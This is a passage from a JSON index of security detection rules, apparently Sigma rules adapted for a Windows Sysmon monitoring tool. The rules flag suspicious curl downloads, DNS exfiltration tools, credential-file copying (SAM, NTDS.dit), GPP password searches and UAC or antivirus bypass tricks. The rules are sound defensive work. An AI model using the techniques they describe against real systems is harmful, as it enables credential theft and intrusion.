endsWith '.dat' || evt.Parsed.CommandLine endsWith '.dat\"' || evt.Parsed.CommandLine endsWith '.dll' || evt.Parsed.CommandLine endsWith '.dll\"' || evt.Parsed.CommandLine endsWith '.exe' || evt.Parsed.CommandLine endsWith '.exe\"' || evt.Parsed.CommandLine endsWith '.gif' || evt.Parsed.CommandLine endsWith '.gif\"' || evt.Parsed.CommandLine endsWith '.hta' || evt.Parsed.CommandLine endsWith '.hta\"' || evt.Parsed.CommandLine endsWith '.jpeg' || evt.Parsed.CommandLine endsWith '.jpeg\"' || evt.Parsed.CommandLine endsWith '.log' || evt.Parsed.CommandLine endsWith '.log\"' || evt.Parsed.CommandLine endsWith '.msi' || evt.Parsed.CommandLine endsWith '.msi\"' || evt.Parsed.CommandLine endsWith '.png' || evt.Parsed.CommandLine endsWith '.png\"' || evt.Parsed.CommandLine endsWith '.ps1' || evt.Parsed.CommandLine endsWith '.ps1\"' || evt.Parsed.CommandLine endsWith '.psm1' || evt.Parsed.CommandLine endsWith '.psm1\"' || evt.Parsed.CommandLine endsWith '.vbe' || evt.Parsed.CommandLine endsWith '.vbe\"' || evt.Parsed.CommandLine endsWith '.vbs' || evt.Parsed.CommandLine endsWith '.vbs\"' || evt.Parsed.CommandLine endsWith '.bat\\'' || evt.Parsed.CommandLine endsWith '.dat\\'' || evt.Parsed.CommandLine endsWith '.dll\\'' || evt.Parsed.CommandLine endsWith '.exe\\'' || evt.Parsed.CommandLine endsWith '.gif\\'' || evt.Parsed.CommandLine endsWith '.hta\\'' || evt.Parsed.CommandLine endsWith '.jpeg\\'' || evt.Parsed.CommandLine endsWith '.log\\'' || evt.Parsed.CommandLine endsWith '.msi\\'' || evt.Parsed.CommandLine endsWith '.png\\'' || evt.Parsed.CommandLine endsWith '.ps1\\'' || evt.Parsed.CommandLine endsWith '.psm1\\'' || evt.Parsed.CommandLine endsWith '.vbe\\'' || evt.Parsed.CommandLine endsWith '.vbs\\''))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n\n  label: \"Suspicious File Download From IP Via Curl.EXE\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects potentially suspicious file downloads directly from IP addresses using curl.exe\n", "path": "scenarios/sigmahq/proc_creation_win_curl_download_direct_ip_susp_extensions.yml", "version": "0.2", "versions": {"0.1": {"digest": "67d6ce851955d59dddd01de7176429ae61afe703073c8abe984a834159b84b1a"}, "0.2": {"digest": "ccd48181a92fb61a2fd79df4f62d63e9fc41d88377bc99126b90b2f4146bc5f8"}}}, "sigmahq/proc_creation_win_curl_susp_download": {"content": "type: trigger\nname: sigmahq/proc_creation_win_curl_susp_download\ndescription: |\n  Detects a suspicious curl process start on Windows and outputs the requested document to a local file\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && ((evt.Parsed.Image endsWith '\\\\curl.exe' || evt.Parsed.Product == 'The curl executable') && (evt.Parsed.CommandLine contains '%AppData%' || evt.Parsed.CommandLine contains '%Public%' || evt.Parsed.CommandLine contains '%Temp%' || evt.Parsed.CommandLine contains '%tmp%' || evt.Parsed.CommandLine contains '\\\\AppData\\\\' || evt.Parsed.CommandLine contains '\\\\Desktop\\\\' || evt.Parsed.CommandLine contains '\\\\Temp\\\\' || evt.Parsed.CommandLine contains '\\\\Users\\\\Public\\\\' || evt.Parsed.CommandLine contains 'C:\\\\PerfLogs\\\\' || evt.Parsed.CommandLine contains 'C:\\\\ProgramData\\\\' || evt.Parsed.CommandLine contains 'C:\\\\Windows\\\\Temp\\\\' || evt.Parsed.CommandLine endsWith '.dll' || evt.Parsed.CommandLine endsWith '.gif' || evt.Parsed.CommandLine endsWith '.jpeg' || evt.Parsed.CommandLine endsWith '.jpg' || evt.Parsed.CommandLine endsWith '.png' || evt.Parsed.CommandLine endsWith '.temp' || evt.Parsed.CommandLine endsWith '.tmp' || evt.Parsed.CommandLine endsWith '.txt' || evt.Parsed.CommandLine endsWith '.vbe' || evt.Parsed.CommandLine endsWith '.vbs') && not (evt.Parsed.ParentImage == 'C:\\\\Program Files\\\\Git\\\\usr\\\\bin\\\\sh.exe' && evt.Parsed.Image == 'C:\\\\Program Files\\\\Git\\\\mingw64\\\\bin\\\\curl.exe' && evt.Parsed.CommandLine contains '--silent --show-error --output ' && evt.Parsed.CommandLine contains 'gfw-httpget-' && evt.Parsed.CommandLine contains 'AppData'))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1105\n\n  label: \"Suspicious Curl.EXE Download\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects a suspicious curl process start on Windows and outputs the requested document to a local file\n", "path": "scenarios/sigmahq/proc_creation_win_curl_susp_download.yml", "version": "0.2", "versions": {"0.1": {"digest": "1fb74872eb270fed048ed476c1d6386a79b7952fac2737bf939f41cb4c649f99"}, "0.2": {"digest": "143608420c478f7b63002a50472f22ffc798ea4a7c6d7f2b807590522d8a8995"}}}, "sigmahq/proc_creation_win_dctask64_arbitrary_command_and_dll_execution": {"content": "type: trigger\nname: sigmahq/proc_creation_win_dctask64_arbitrary_command_and_dll_execution\ndescription: |\n  Detects the execution of \"dctask64.exe\", a signed binary by ZOHO Corporation part of ManageEngine Endpoint Central. This binary can be abused for DLL injection, arbitrary command and process execution. \nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && ((evt.Parsed.Image endsWith '\\\\dctask64.exe' || evt.Parsed.Hashes contains '6834B1B94E49701D77CCB3C0895E1AFD' || evt.Parsed.Hashes contains '1BB6F93B129F398C7C4A76BB97450BBA' || evt.Parsed.Hashes contains 'FAA2AC19875FADE461C8D89DCF2710A3' || evt.Parsed.Hashes contains 'F1039CED4B91572AB7847D26032E6BBF') && (evt.Parsed.CommandLine contains ' executecmd64 ' || evt.Parsed.CommandLine contains ' invokeexe ' || evt.Parsed.CommandLine contains ' injectDll '))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1055.001\n\n  label: \"ManageEngine Endpoint Central Dctask64.EXE Potential Abuse\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects the execution of \"dctask64.exe\", a signed binary by ZOHO Corporation part of ManageEngine Endpoint Central. This binary can be abused for DLL injection, arbitrary command and process execution. \n", "path": "scenarios/sigmahq/proc_creation_win_dctask64_arbitrary_command_and_dll_execution.yml", "version": "0.2", "versions": {"0.1": {"digest": "f7a181ad0a162ae296985b718fe884b638f81854ac0d6013ebd59843b822da0d"}, "0.2": {"digest": "82d1d52cb5acc49abf5dfa657db9d6e407fd896b4514a97a68351134b9339d8f"}}}, "sigmahq/proc_creation_win_desktopimgdownldr_susp_execution": {"content": "type: trigger\nname: sigmahq/proc_creation_win_desktopimgdownldr_susp_execution\ndescription: |\n  Detects a suspicious Microsoft desktopimgdownldr execution with parameters used to download files from the Internet\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.CommandLine contains ' /lockscreenurl:' && not (evt.Parsed.CommandLine contains '.jpg' || evt.Parsed.CommandLine contains '.jpeg' || evt.Parsed.CommandLine contains '.png') || evt.Parsed.CommandLine contains 'reg delete' && evt.Parsed.CommandLine contains '\\\\PersonalizationCSP')\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1105\n\n  label: \"Suspicious Desktopimgdownldr Command\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects a suspicious Microsoft desktopimgdownldr execution with parameters used to download files from the Internet\n", "path": "scenarios/sigmahq/proc_creation_win_desktopimgdownldr_susp_execution.yml", "version": "0.2", "versions": {"0.1": {"digest": "00428e9280b7c9a159bf07d1e5d44081b3246321ed2a203a03a447f36b074c38"}, "0.2": {"digest": "a9c7c5ae543ca862a882b92a8650dbb31193fad77133af48c356f4c83eeafdcc"}}}, "sigmahq/proc_creation_win_dism_enable_powershell_web_access_feature": {"content": "type: trigger\nname: sigmahq/proc_creation_win_dism_enable_powershell_web_access_feature\ndescription: |\n  Detects the use of DISM to enable the PowerShell Web Access feature, which could be used for remote access and potential abuse\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && ((evt.Parsed.Image endsWith '\\\\dism.exe' || evt.Parsed.OriginalFileName == 'DISM.EXE') && evt.Parsed.CommandLine contains 'WindowsPowerShellWebAccess' && evt.Parsed.CommandLine contains '/online' && evt.Parsed.CommandLine contains '/enable-feature')\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1548.002\n\n  label: \"PowerShell Web Access Feature Enabled Via DISM\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects the use of DISM to enable the PowerShell Web Access feature, which could be used for remote access and potential abuse\n", "path": "scenarios/sigmahq/proc_creation_win_dism_enable_powershell_web_access_feature.yml", "version": "0.2", "versions": {"0.1": {"digest": "70a0d1ba23659a054e43f3c26091d2cd467bb0338443a15364b38b4e4190b8aa"}, "0.2": {"digest": "dfbfbec777016cbcad5ba8885a6f009db68ef88915ee668fcb13a432270b9519"}}}, "sigmahq/proc_creation_win_dll_sideload_vmware_xfer": {"content": "type: trigger\nname: sigmahq/proc_creation_win_dll_sideload_vmware_xfer\ndescription: |\n  Detects execution of VMware Xfer utility (VMwareXferlogs.exe) from the non-default directory which may be an attempt to sideload arbitrary DLL\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.Image endsWith '\\\\VMwareXferlogs.exe' && not (evt.Parsed.Image startsWith 'C:\\\\Program Files\\\\VMware\\\\'))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1574.002\n\n  label: \"DLL Sideloading by VMware Xfer Utility\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects execution of VMware Xfer utility (VMwareXferlogs.exe) from the non-default directory which may be an attempt to sideload arbitrary DLL\n", "path": "scenarios/sigmahq/proc_creation_win_dll_sideload_vmware_xfer.yml", "version": "0.2", "versions": {"0.1": {"digest": "6845f302e8a00273a0137c97a77fbae912bbef0e27e17016d1e21fb39fd6c0d9"}, "0.2": {"digest": "fed31324c82e6dcfe879170961a2b8fd21a9545e9ddae71418064ecf9f5ac445"}}}, "sigmahq/proc_creation_win_dllhost_no_cli_execution": {"content": "type: trigger\nname: sigmahq/proc_creation_win_dllhost_no_cli_execution\ndescription: |\n  Detects a \"dllhost\" process spawning with no commandline arguments which is very rare to happen and could indicate process injection activity or malware mimicking similar system processes.\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.Image endsWith '\\\\dllhost.exe' && (evt.Parsed.CommandLine in ['dllhost.exe', 'dllhost']) && not (evt.Parsed.CommandLine == ''))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1055\n\n  label: \"Dllhost.EXE Execution Anomaly\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects a \"dllhost\" process spawning with no commandline arguments which is very rare to happen and could indicate process injection activity or malware mimicking similar system processes.\n", "path": "scenarios/sigmahq/proc_creation_win_dllhost_no_cli_execution.yml", "version": "0.2", "versions": {"0.1": {"digest": "77bd737695f00d0ac03605b6cf03adf6bbcfaf38a4dff687a0dc022f2e677838"}, "0.2": {"digest": "8f3205a11bfbefa2c8df228d5e2f5cf1f9ab625668ebece4247f6766ac922672"}}}, "sigmahq/proc_creation_win_dns_exfiltration_tools_execution": {"content": "type: trigger\nname: sigmahq/proc_creation_win_dns_exfiltration_tools_execution\ndescription: |\n  Well-known DNS Exfiltration tools execution\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.Image endsWith '\\\\iodine.exe' || evt.Parsed.Image contains '\\\\dnscat2')\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1048.001\n   - attack.t1071.004\n   - attack.t1132.001\n\n  label: \"DNS Exfiltration and Tunneling Tools Execution\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Well-known DNS Exfiltration tools execution\n", "path": "scenarios/sigmahq/proc_creation_win_dns_exfiltration_tools_execution.yml", "version": "0.2", "versions": {"0.1": {"digest": "77a505396e899a56aaa6ec4806f95efee05af44c814fcbc329b7c044f75a4dff"}, "0.2": {"digest": "d1fc98bad3f97ef671971213eca364dd81dc45d4936ca2ae79db1baa662dc987"}}}, "sigmahq/proc_creation_win_dns_susp_child_process": {"content": "type: trigger\nname: sigmahq/proc_creation_win_dns_susp_child_process\ndescription: |\n  Detects an unexpected process spawning from dns.exe which may indicate activity related to remote code execution or other forms of exploitation as seen in CVE-2020-1350 (SigRed)\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.ParentImage endsWith '\\\\dns.exe' && not (evt.Parsed.Image endsWith '\\\\conhost.exe'))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1133\n\n  label: \"Unusual Child Process of dns.exe\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects an unexpected process spawning from dns.exe which may indicate activity related to remote code execution or other forms of exploitation as seen in CVE-2020-1350 (SigRed)\n", "path": "scenarios/sigmahq/proc_creation_win_dns_susp_child_process.yml", "version": "0.2", "versions": {"0.1": {"digest": "c401dcfa05795dd681bcbb3787ae0e193acc23c04520429d8dc67f930e489476"}, "0.2": {"digest": "d4cbde6d1dd169fb63cb9b002166041036a089e3f2044e8ad0de4753a9173278"}}}, "sigmahq/proc_creation_win_dnscmd_install_new_server_level_plugin_dll": {"content": "type: trigger\nname: sigmahq/proc_creation_win_dnscmd_install_new_server_level_plugin_dll\ndescription: |\n  Detects the installation of a DNS plugin DLL via ServerLevelPluginDll parameter in registry, which can be used to execute code in context of the DNS server (restart required)\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.Image endsWith '\\\\dnscmd.exe' && evt.Parsed.CommandLine contains '/config' && evt.Parsed.CommandLine contains '/serverlevelplugindll')\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1574.002\n   - attack.t1112\n\n  label: \"New DNS ServerLevelPluginDll Installed Via Dnscmd.EXE\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects the installation of a DNS plugin DLL via ServerLevelPluginDll parameter in registry, which can be used to execute code in context of the DNS server (restart required)\n", "path": "scenarios/sigmahq/proc_creation_win_dnscmd_install_new_server_level_plugin_dll.yml", "version": "0.2", "versions": {"0.1": {"digest": "38614c798d62adbe1fa04bbe86f533d8c5baf40de06fb44e367668315b3ffdd8"}, "0.2": {"digest": "3fa5300d595ceb321d4c24e92050c98a96b8660b115f11170bd132c891df7c65"}}}, "sigmahq/proc_creation_win_driverquery_recon": {"content": "type: trigger\nname: sigmahq/proc_creation_win_driverquery_recon\ndescription: |\n  Detect usage of the \"driverquery\" utility to perform reconnaissance on installed drivers\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && ((evt.Parsed.Image endsWith 'driverquery.exe' || evt.Parsed.OriginalFileName == 'drvqry.exe') && (evt.Parsed.ParentImage endsWith '\\\\cscript.exe' || evt.Parsed.ParentImage endsWith '\\\\mshta.exe' || evt.Parsed.ParentImage endsWith '\\\\regsvr32.exe' || evt.Parsed.ParentImage endsWith '\\\\rundll32.exe' || evt.Parsed.ParentImage endsWith '\\\\wscript.exe' || evt.Parsed.ParentImage contains '\\\\AppData\\\\Local\\\\' || evt.Parsed.ParentImage contains '\\\\Users\\\\Public\\\\' || evt.Parsed.ParentImage contains '\\\\Windows\\\\Temp\\\\'))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n\n  label: \"Potential Recon Activity Using DriverQuery.EXE\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detect usage of the \"driverquery\" utility to perform reconnaissance on installed drivers\n", "path": "scenarios/sigmahq/proc_creation_win_driverquery_recon.yml", "version": "0.2", "versions": {"0.1": {"digest": "24750447f37de509c8ed92e55f29e4825ca34cafd8454eb963aa3508b4493960"}, "0.2": {"digest": "c8f126bd1bb8c301e58f6d46fd426b2df5651cfc9b4df39c2b473ed11bb46acf"}}}, "sigmahq/proc_creation_win_dtrace_kernel_dump": {"content": "type: trigger\nname: sigmahq/proc_creation_win_dtrace_kernel_dump\ndescription: |\n  Detects suspicious way to dump the kernel on Windows systems using dtrace.exe, which is available on Windows systems since Windows 10 19H1\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.Image endsWith '\\\\dtrace.exe' && evt.Parsed.CommandLine contains 'lkd(0)' || evt.Parsed.CommandLine contains 'syscall:::return' && evt.Parsed.CommandLine contains 'lkd(')\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1082\n\n  label: \"Suspicious Kernel Dump Using Dtrace\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects suspicious way to dump the kernel on Windows systems using dtrace.exe, which is available on Windows systems since Windows 10 19H1\n", "path": "scenarios/sigmahq/proc_creation_win_dtrace_kernel_dump.yml", "version": "0.2", "versions": {"0.1": {"digest": "c7f215f1583407a401fd78c6acba94dea00e39f38cb9e42ab33f295063f8a087"}, "0.2": {"digest": "4d084b613a9d8d0967a01ae25ec3d497f474dab4b4b5d29fefe81e89d3931eea"}}}, "sigmahq/proc_creation_win_dump64_defender_av_bypass_rename": {"content": "type: trigger\nname: sigmahq/proc_creation_win_dump64_defender_av_bypass_rename\ndescription: |\n  Detects when a user is potentially trying to bypass the Windows Defender AV by renaming a tool to dump64.exe and placing it in the Visual Studio folder. Currently the rule is covering only usage of procdump but other utilities can be added in order to increase coverage. \nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.Image startsWith ':\\\\Program Files' && evt.Parsed.Image contains '\\\\Microsoft Visual Studio\\\\' && evt.Parsed.Image endsWith '\\\\dump64.exe' && (evt.Parsed.OriginalFileName == 'procdump' || evt.Parsed.CommandLine contains ' -ma ' || evt.Parsed.CommandLine contains ' -mp '))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1003.001\n\n  label: \"Potential Windows Defender AV Bypass Via Dump64.EXE Rename\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects when a user is potentially trying to bypass the Windows Defender AV by renaming a tool to dump64.exe and placing it in the Visual Studio folder. Currently the rule is covering only usage of procdump but other utilities can be added in order to increase coverage. \n", "path": "scenarios/sigmahq/proc_creation_win_dump64_defender_av_bypass_rename.yml", "version": "0.2", "versions": {"0.1": {"digest": "d56d5ed1c1f22d9e7c8aca47ad0995c9eae3847b8e0c4ce2fbd7b13f646f2f11"}, "0.2": {"digest": "91ca74d9b84173bac0fd8904d968318fd411f2c936a1de702358389981421474"}}}, "sigmahq/proc_creation_win_dumpminitool_susp_execution": {"content": "type: trigger\nname: sigmahq/proc_creation_win_dumpminitool_susp_execution\ndescription: |\n  Detects suspicious ways to use the \"DumpMinitool.exe\" binary\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && ((evt.Parsed.Image endsWith '\\\\DumpMinitool.exe' || evt.Parsed.Image endsWith '\\\\DumpMinitool.x86.exe' || evt.Parsed.Image endsWith '\\\\DumpMinitool.arm64.exe' || evt.Parsed.OriginalFileName in ['DumpMinitool.exe', 'DumpMinitool.x86.exe', 'DumpMinitool.arm64.exe']) && (not (evt.Parsed.Image contains '\\\\Microsoft Visual Studio\\\\' || evt.Parsed.Image contains '\\\\Extensions\\\\') || evt.Parsed.CommandLine contains '.txt' || (evt.Parsed.CommandLine contains ' Full' || evt.Parsed.CommandLine contains ' Mini' || evt.Parsed.CommandLine contains ' WithHeap') && not (evt.Parsed.CommandLine contains '--dumpType')))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1036\n   - attack.t1003.001\n\n  label: \"Suspicious DumpMinitool Execution\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects suspicious ways to use the \"DumpMinitool.exe\" binary\n", "path": "scenarios/sigmahq/proc_creation_win_dumpminitool_susp_execution.yml", "version": "0.2", "versions": {"0.1": {"digest": "891af077eeab44c63f7d72bc2f4bb43530cac0f18b416df3842b0c71dedf780b"}, "0.2": {"digest": "4bdbbfda1da4ee9309ff31c30966dfdbd40034bf2362498e5c2eea4ec4b38c6d"}}}, "sigmahq/proc_creation_win_esentutl_sensitive_file_copy": {"content": "type: trigger\nname: sigmahq/proc_creation_win_esentutl_sensitive_file_copy\ndescription: |\n  Files with well-known filenames (sensitive files with credential data) copying\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && ((evt.Parsed.Image endsWith '\\\\esentutl.exe' || evt.Parsed.OriginalFileName == '\\\\esentutl.exe') && (evt.Parsed.CommandLine contains 'vss' || evt.Parsed.CommandLine contains ' -m ' || evt.Parsed.CommandLine contains ' /m ' || evt.Parsed.CommandLine contains ' \u2013m ' || evt.Parsed.CommandLine contains ' \u2014m ' || evt.Parsed.CommandLine contains ' \u2015m ' || evt.Parsed.CommandLine contains ' -y ' || evt.Parsed.CommandLine contains ' /y ' || evt.Parsed.CommandLine contains ' \u2013y ' || evt.Parsed.CommandLine contains ' \u2014y ' || evt.Parsed.CommandLine contains ' \u2015y ') || evt.Parsed.CommandLine contains '\\\\config\\\\RegBack\\\\sam' || evt.Parsed.CommandLine contains '\\\\config\\\\RegBack\\\\security' || evt.Parsed.CommandLine contains '\\\\config\\\\RegBack\\\\system' || evt.Parsed.CommandLine contains '\\\\config\\\\sam' || evt.Parsed.CommandLine contains '\\\\config\\\\security' || evt.Parsed.CommandLine contains '\\\\config\\\\system ' || evt.Parsed.CommandLine contains '\\\\repair\\\\sam' || evt.Parsed.CommandLine contains '\\\\repair\\\\security' || evt.Parsed.CommandLine contains '\\\\repair\\\\system' || evt.Parsed.CommandLine contains '\\\\windows\\\\ntds\\\\ntds.dit')\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1003.002\n   - attack.t1003.003\n\n  label: \"Copying Sensitive Files with Credential Data\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Files with well-known filenames (sensitive files with credential data) copying\n", "path": "scenarios/sigmahq/proc_creation_win_esentutl_sensitive_file_copy.yml", "version": "0.2", "versions": {"0.1": {"digest": "8634b8753123ba995d211d7d11484e4c4738b3c2e2d1b76d77c4dffaa9639c99"}, "0.2": {"digest": "b19552f41d760acac375f3d8e881a5055b9ab7f93183af26a2190efaa8773896"}}}, "sigmahq/proc_creation_win_eventvwr_susp_child_process": {"content": "type: trigger\nname: sigmahq/proc_creation_win_eventvwr_susp_child_process\ndescription: |\n  Detects uncommon or suspicious child processes of \"eventvwr.exe\" which might indicate a UAC bypass attempt\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.ParentImage endsWith '\\\\eventvwr.exe' && not (evt.Parsed.Image endsWith ':\\\\Windows\\\\System32\\\\mmc.exe' || evt.Parsed.Image endsWith ':\\\\Windows\\\\System32\\\\WerFault.exe' || evt.Parsed.Image endsWith ':\\\\Windows\\\\SysWOW64\\\\WerFault.exe'))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1548.002\n\n  label: \"Potentially Suspicious Event Viewer Child Process\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects uncommon or suspicious child processes of \"eventvwr.exe\" which might indicate a UAC bypass attempt\n", "path": "scenarios/sigmahq/proc_creation_win_eventvwr_susp_child_process.yml", "version": "0.2", "versions": {"0.1": {"digest": "cb977f8c5af331d3d0c0556a67c18f29a687659ed0e2af8df95e603207528f6d"}, "0.2": {"digest": "9c985e047618fe2e27e7d143b696f5d4388873e71f899b04ced820fca0d1050f"}}}, "sigmahq/proc_creation_win_explorer_nouaccheck": {"content": "type: trigger\nname: sigmahq/proc_creation_win_explorer_nouaccheck\ndescription: |\n  Detects suspicious starts of explorer.exe that use the /NOUACCHECK flag that allows to run all sub processes of that newly started explorer.exe without any UAC checks\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.Image endsWith '\\\\explorer.exe' && evt.Parsed.CommandLine contains '/NOUACCHECK' && not (evt.Parsed.ParentCommandLine == 'C:\\\\Windows\\\\system32\\\\svchost.exe -k netsvcs -p -s Schedule' || evt.Parsed.ParentImage == 'C:\\\\Windows\\\\System32\\\\svchost.exe'))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1548.002\n\n  label: \"Explorer NOUACCHECK Flag\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects suspicious starts of explorer.exe that use the /NOUACCHECK flag that allows to run all sub processes of that newly started explorer.exe without any UAC checks\n", "path": "scenarios/sigmahq/proc_creation_win_explorer_nouaccheck.yml", "version": "0.2", "versions": {"0.1": {"digest": "38a938317d8264745ab39e946627c45ccc376a4aea61efd0ca01c0ad10162272"}, "0.2": {"digest": "bf3bc1fafb9386ba761bb520950e6c31a6be025ac45bfac6821c989f67ed2db6"}}}, "sigmahq/proc_creation_win_findstr_gpp_passwords": {"content": "type: trigger\nname: sigmahq/proc_creation_win_findstr_gpp_passwords\ndescription: |\n  Look for the encrypted cpassword value within Group Policy Preference files on the Domain Controller. This value can be decrypted with gpp-decrypt.\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && ((evt.Parsed.Image endsWith '\\\\find.exe' || evt.Parsed.Image endsWith '\\\\findstr.exe' || evt.Parsed.OriginalFileName in ['FIND.EXE', 'FINDSTR.EXE']) && evt.Parsed.CommandLine contains 'cpassword' && evt.Parsed.CommandLine contains '\\\\sysvol\\\\' && evt.Parsed.CommandLine contains '.xml')\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1552.006\n\n  label: \"Findstr GPP Passwords\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Look for the encrypted cpassword value within Group Policy Preference files on the Domain Controller. This value can be decrypted with gpp-decrypt.\n", "path": "scenarios/sigmahq/proc_creation_win_findstr_gpp_passwords.yml", "version": "0.2", "versions": {"0.1": {"digest": "eca9fb20f5653015bd949b222313eaa3f845d84693ef6ca7d1667f9b19852004"}, "0.2": {"digest": "140acaafbbaeeb2fbc56199f743f4b04b7d31ed6d80694b69575ae9ea6e9dab4"}}}, "sigmahq/proc_creation_win_findstr_sysmon_discovery_via_default_altitude": {"content": "type: trigger\nname: sigmahq/proc_creation_win_findstr_sysmon_discovery_via_default_altitude\ndescription: |\n  Detects usage of \"findstr\" with the argument \"385201\". Which could indicate potential discovery of an installed Sysinternals Sysmon service using the default driver altitude (even if the name is changed).\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && ((evt.Parsed.Image endsWith '\\\\find.exe' || evt.Parsed.Image endsWith '\\\\findstr.exe' || evt.Parsed.OriginalFileName in ['FIND.EXE', 'FINDSTR.EXE']) && evt.Parsed.CommandLine contains ' 385201')\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1518.001\n\n  label: \"Sysmon Discovery Via Default Driver Altitude Using Findstr.EXE\"\n  behavior : \"windows:audit\"\n  remediation: 